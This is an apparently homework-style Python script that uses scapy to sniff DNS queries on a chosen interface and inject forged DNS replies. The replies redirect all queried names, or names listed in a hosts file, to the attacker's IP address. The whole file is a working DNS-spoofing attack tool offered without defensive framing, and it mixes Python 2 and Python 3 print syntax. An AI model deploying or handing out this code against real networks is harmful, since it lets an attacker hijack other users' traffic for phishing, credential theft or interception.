#!/usr/bin/env python
import argparse
import socket
from scapy.all import *
import netifaces 
from netifaces import AF_INET, ifaddresses



def spoof_packet(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt[DNS].qr==0: 
               
                victim = pkt[DNSQR].qname
                spoof= False
                if hostname is None:
                    print ("host filename not given, will redirect all dns requests to attacker ip")
                    #redirect_to = '172.24.30.101'
                    redirect_to=netifaces.ifaddresses(interface)[AF_INET][0]['addr']
                    spoof=True
                else:
                    with open(hostname) as fp:
                        for line in fp:
                            print (line)
                            if victim.rstrip('.') in line:
                                mylist = line.split(" ")
                                redirect_to = mylist[0]
                                spoof=True
                if spoof:
                    if pkt.haslayer(UDP):                               
                        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                                  DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_to))
                        send(spoofed_pkt)
                        print ('Sent packet', spoofed_pkt.summary())
                    

if __name__ == '__main__':
    expression=""
    parser = argparse.ArgumentParser(add_help=False, description="input for dns inject program")
    parser.add_argument("-i")
    parser.add_argument("-h")
    parser.add_argument('expression', nargs='?',action="store")
    args = parser.parse_args()
        
    interface=args.i
    hostname=args.h
    expression=args.expression
    
    if expression and len(expression)!=0:
        print("entered filter expression:")
        print(expression)
    else:
        print("default filter expreesion taken as empty string")
        expression=""
    if hostname:
        print("entered hostname:")
        print(hostname)
    else:
        print("no file name for hosts to be hijacked provided, will spoof all requests now")
    if interface:
        print("entered interface:")
        print(interface)
    else:
        print ("No interface name entered, using default interface for capture")
        interfacelist=netifaces.interfaces()
        for intf in interfacelist:
            if('lo' not in intf):
                interface=intf
                break

    print interface  
    if interface:    
        sniff(filter=expression, iface=str(interface), store=0, prn=spoof_packet)
